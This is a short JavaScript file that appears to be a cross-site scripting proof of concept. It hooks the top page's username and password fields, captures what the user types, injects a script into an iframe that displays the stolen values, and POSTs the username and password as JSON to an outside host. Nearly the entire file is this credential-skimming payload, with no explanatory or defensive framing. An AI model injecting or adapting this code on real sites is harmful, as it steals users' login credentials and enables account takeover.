// alert('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
top.console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');

// f = document.createElement("iframe");
// f.id = "pwn";
// f.src = "/";
var usr;
var pw;
// f.onload = () => {

top.document.addEventListener('change', e => {
  if (event.target.matches('#username')) {
    usr = e.target.value;
    console.log("assign user");
  } else if (e.target.matches('#password')) {
    console.log("assign pw");
    pw = e.target.value

    if (usr.length && pw.length) {
      console.log("submitting form", usr, pw);
      pw = top.password.value;
      x = document.createElement('script');
      x.src = 'data:,alert("Pwned "+usr+" "+pw)';
      pwn.contentWindow.document.body.appendChild(x)
      alert('Wow!, submitted usr password ' + usr + ' ' + pw);

      fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST',
        headers: {'Accept': 'application/json', 'Content-Type': 'application/json' },
        body: JSON.stringify({a: usr, b: pw})
      }).then(resp => {
        console.log(resp.json());
      })
    }
  }
}, false)
  // top.username.addEventListener('change', e => usr = e.target.value);
  // top.password.addEventListener('change', e => usr = e.target.value);